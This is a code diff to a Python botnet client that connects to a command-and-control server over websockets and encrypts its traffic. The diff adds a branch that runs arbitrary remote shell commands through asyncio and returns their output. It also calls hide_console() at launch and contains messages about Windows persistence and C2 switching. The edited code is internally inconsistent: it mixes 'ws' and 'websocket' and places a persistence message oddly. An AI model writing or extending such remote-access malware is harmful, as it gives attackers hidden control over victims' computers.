@@ -143,14 +143,26 @@ async def bot_client(bot_id: str):
                                 await ws.send(encrypt_message(result))
                             except Exception as e:
                                 await ws.send(encrypt_message(f"[ERROR] Shell execution failed: {str(e)}"))
-
-                    except websockets.exceptions.ConnectionClosed:
-                        break
+                            await websocket.send(encrypt_message("[SYSTEM] Persistence failed: Not Windows"))
+                    
+                    else:
+                        # Shell commands
+                        try:
+                            proc = await asyncio.create_subprocess_shell(
+                                command,
+                                stdout=asyncio.subprocess.PIPE,
+                                stderr=asyncio.subprocess.PIPE
+                            )
+                            stdout, stderr = await proc.communicate()
+                            output = (stdout.decode() + stderr.decode()).strip()
+                            await websocket.send(encrypt_message(output or "Command executed."))
+                        except Exception as e:
+                            await websocket.send(encrypt_message(f"Error: {str(e)}"))
 
         except Exception as e:
-            print(f"[-] Connection lost. Switching C2... ({e})")
-            await asyncio.sleep(random.uniform(10, 35))
+            print(f"[!] Connection failed, retrying in 5s... ({e})")
+            await asyncio.sleep(5)
 
 if __name__ == "__main__":
-    bot_id = sys.argv[1] if len(sys.argv) > 1 else f"bot-{os.urandom(4).hex()}"
-    asyncio.run(bot_client(bot_id))
+    hide_console()
+    asyncio.run(run_bot())
